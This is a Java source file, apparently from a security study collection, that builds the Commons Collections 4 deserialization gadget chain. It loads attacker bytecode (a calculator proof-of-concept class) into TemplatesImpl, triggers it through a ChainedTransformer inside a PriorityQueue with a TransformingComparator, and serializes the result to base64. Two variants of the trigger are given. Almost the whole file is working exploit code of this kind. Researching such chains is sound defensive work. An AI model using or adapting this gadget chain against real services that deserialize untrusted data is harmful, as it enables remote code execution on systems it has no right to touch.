package exp;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

import static tools.Decode.unserializeBase64Decode;
import static tools.Encode.serializeBase64Encode;
import static tools.SetField.setField;

public class CC4 {
    public static void main(String[] args) throws  Exception{
        TemplatesImpl templates = new TemplatesImpl();
        setField(templates, "_name", "CC2");
        byte[] code = Files.readAllBytes(Paths.get("src/main/java/classpoc/Calc.class"));
        byte[][] codes = {code};
        setField(templates, "_bytecodes",codes);
        setField(templates, "_tfactory",new TransformerFactoryImpl());
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
        };
        ChainedTransformer chainedtransformer = new ChainedTransformer(transformers);

/// ==========================================方式一==========================================
        TransformingComparator transformingComparator = new TransformingComparator<>(chainedtransformer);
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
        setField(priorityQueue,"size",2);
        setField(priorityQueue,"queue",new Object[]{templates, templates});
/// ==========================================方式一==========================================

/// ==========================================方式二==========================================
//        TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));
//        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
//        priorityQueue.add(templates);
//        priorityQueue.add(templates);
//        setField(transformingComparator,"transformer",chainedtransformer);
/// ==========================================方式二==========================================

        serializeBase64Encode(priorityQueue);
        unserializeBase64Decode("ser.bin");
    }
}
